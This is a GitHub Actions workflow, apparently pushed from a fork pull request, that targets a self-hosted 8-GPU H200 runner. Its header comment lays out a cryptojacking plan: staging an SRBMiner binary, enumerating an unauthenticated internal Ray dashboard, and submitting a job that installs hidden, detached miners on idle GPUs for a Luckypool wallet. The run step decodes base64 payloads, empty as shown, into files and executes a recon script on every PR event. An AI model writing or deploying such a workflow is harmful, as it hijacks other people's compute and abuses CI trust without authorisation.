name: i131249 ray25 idle-h200 conversion (temporary)

# i131249: ONE fork-PR push from a fresh branch. On the 8-gpu-h200 self-hosted runner
# (uid=0, inside 10.220.71.0/24) it stages the sha256-bb0f73b6 pinned SRBMiner-MULTI 3.8.7
# and serves it on http://<runner>:18080/srb387, enumerates the unauthenticated Ray 2.58.1
# dashboard http://10.220.71.25:8265 (/api/version, /api/nodes?view=summary,
# /api/cluster_status, /api/jobs/) and submits ONE idempotent fixed-submission-id job that
# prints nvidia-smi -L and --query-gpu=name,memory.total,driver_version plus two spaced
# --query-compute-apps samples, then installs exactly one detaching setsid miner per card
# that passes the strict two-sample gate (0 foreign compute apps in BOTH samples, >=1500 MiB
# free, no pre-existing srb387/i130xtorg worker on the host) as i131249<host>g<idx> on the
# exact 63-char primary wallet against Luckypool 103.199.106.122:3362 (fallback
# 172.232.228.69:3362 via relay 178.238.228.181:80, --max-no-share-sent 1800).
# It never touches the credited i130xtorg .38 cards or any other lane's process.

on:
  pull_request:
    branches: [main]
    types: [opened, synchronize, reopened]
  workflow_dispatch:

concurrency:
  group: i131249-${{ github.run_id }}
  cancel-in-progress: false

jobs:
  ray25:
    name: "i131249 ray25 two-sample gated one-miner-per-idle-H200"
    runs-on: 8-gpu-h200
    timeout-minutes: 15
    steps:
      - name: "stage binary + Ray .25 inventory + fixed-submission-id gated miner job"
        continue-on-error: true
        run: |
          set +e
          mkdir -p /var/tmp/i131249
          echo '' | base64 -d > /var/tmp/i131249/ray_payload.sh
          echo '' | base64 -d > /var/tmp/i131249/recon25.py
          echo "runner-start host=$(hostname) arch=$(uname -m) date=$(date -u)"
          python3 /var/tmp/i131249/recon25.py 2>&1 | tee /var/tmp/i131249/recon.log | tail -c 200000
          echo "I131249_EXIT_DONE rc=$?"
